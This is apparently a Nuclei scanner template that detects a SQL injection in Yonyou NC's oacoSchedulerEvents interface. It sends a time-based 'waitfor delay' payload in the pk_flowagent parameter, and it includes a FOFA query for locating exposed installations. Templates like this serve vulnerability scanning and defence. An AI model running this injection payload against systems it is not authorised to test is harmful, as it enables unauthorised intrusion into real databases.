http:
- matchers:
  - dsl:
    - duration>=5
    type: dsl
  raw:
  - '@timeout: 10s

    GET /portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1''waitfor+delay+''0:0:5''--
    HTTP/1.1

    Host: {{Hostname}}

    '
id: yonyou-nc-oacoSchedulerEvents-sqli
info:
  author: Co5mos
  description: Yonyou NC exposes a SQL injection vulnerability in the oacoSchedulerEvents
    interface via the pk_flowagent parameter. This can be exploited to manipulate
    SQL queries by injecting arbitrary SQL code.
  metadata:
    fofa-query: "app=\"\u7528\u53CB-UFIDA-NC\""
  name: SQL Injection in Yonyou NC oacoSchedulerEvents Interface
  severity: high
  tags: sqli,yonyou
